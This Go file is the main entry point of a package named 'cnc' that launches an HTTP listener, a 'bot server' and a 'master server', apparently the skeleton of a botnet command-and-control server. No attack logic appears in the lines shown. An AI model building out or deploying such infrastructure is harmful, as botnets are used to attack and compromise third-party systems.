package main

import (
	"cnc/lib/http"
	"cnc/lib/socket"
)

func main() {
	go http.ListenHttpServer()
	go socket.StartBotServer()
	go socket.StartMasterServer()

	select {}
}
